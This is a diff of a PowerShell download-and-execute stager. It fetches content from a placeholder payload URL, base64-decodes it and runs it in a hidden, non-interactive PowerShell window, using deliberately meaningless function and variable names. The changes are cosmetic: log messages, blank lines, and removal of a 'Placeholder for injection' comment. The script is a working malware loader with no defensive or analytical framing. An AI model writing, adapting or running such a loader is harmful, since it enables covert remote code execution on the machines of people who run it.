@@ -1,8 +1,9 @@
+Write-Host "[INFO] Starting PowerShell script execution."
+
 function XhYjVwJtKz {
     param (
         [string]$AaBbCcDdEe
     )
-
     try {
         Write-Host "[INFO] Fetching payload from: $AaBbCcDdEe"
         $FfGgHhIiJj = Invoke-WebRequest -Uri $AaBbCcDdEe -TimeoutSec 10
@@ -19,9 +20,8 @@ function XoRpQkZtLs {
     param (
         [string]$PpQqRrSsTt
     )
-
     try {
-        Write-Host "[INFO] Decoding payload and executing..."
+        Write-Host "[INFO] Decoding payload..."
         $UuVvWwXxYy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($PpQqRrSsTt))
         Write-Host "[INFO] Executing payload..."
         powershell.exe -NoP -NonI -W Hidden -Command $UuVvWwXxYy
@@ -32,8 +32,7 @@ function XoRpQkZtLs {
     }
 }
 
-$QwErTyUuOo = "__PAYLOAD_URL__"  # Placeholder for injection
-
+$QwErTyUuOo = "__PAYLOAD_URL__"  
 Write-Host "[INFO] Using payload URL: $QwErTyUuOo"
 
 $VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo
@@ -46,5 +45,5 @@ if ($VvWwXxYyZz) {
     Write-Host "[ERROR] No payload fetched. Exiting..."
 }
 
-# Keep the console open
 Read-Host "Press Enter to exit"
+
